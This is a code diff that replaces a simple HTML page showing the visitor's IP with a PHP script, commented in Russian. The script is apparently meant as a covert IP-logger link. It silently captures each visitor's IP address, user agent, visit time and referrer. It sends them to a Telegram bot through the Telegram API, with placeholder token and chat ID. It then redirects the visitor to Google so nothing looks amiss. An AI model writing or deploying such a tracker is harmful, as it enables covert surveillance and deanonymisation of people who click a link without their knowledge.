@@ -1,30 +1,26 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Check Your IP</title>
-</head>
-<body>
-    <h1>Your IP Address:</h1>
-    <div id="ip">Detecting...</div>
+<?php
+// Получаем данные
+$ip = $_SERVER['REMOTE_ADDR'];
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$time = date('Y-m-d H:i:s');
+$referer = $_SERVER['HTTP_REFERER'] ?? 'Прямой переход';
 
-    <script>
-        // Простой запрос для получения IP
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                // Показываем IP на странице
-                document.getElementById('ip').textContent = data.ip;
-                
-                // Сохраняем в localStorage
-                localStorage.setItem('userIP', data.ip);
-                localStorage.setItem('visitTime', new Date().toString());
-                
-                console.log('IP saved:', data.ip);
-            })
-            .catch(error => {
-                document.getElementById('ip').textContent = 'Error';
-            });
-    </script>
-</body>
-</html>
+// Формируем сообщение
+$message = "Новый переход!%0A";
+$message .= "IP: " . $ip . "%0A";
+$message .= "User-Agent: " . $userAgent . "%0A";
+$message .= "Время: " . $time . "%0A";
+$message .= "Источник: " . $referer;
 
+// Отправляем в Telegram
+$telegramToken = "YOUR_BOT_TOKEN";
+$chatId = "YOUR_CHAT_ID";
+$url = "https://api.telegram.org/bot" . $telegramToken . "/sendMessage?chat_id=" . $chatId . "&text=" . $message;
+
+// Инициируем запрос
+file_get_contents($url);
+
+// Перенаправляем пользователя на любую целевую страницу (например, Google)
+header('Location: https://google.com');
+exit();
+?>
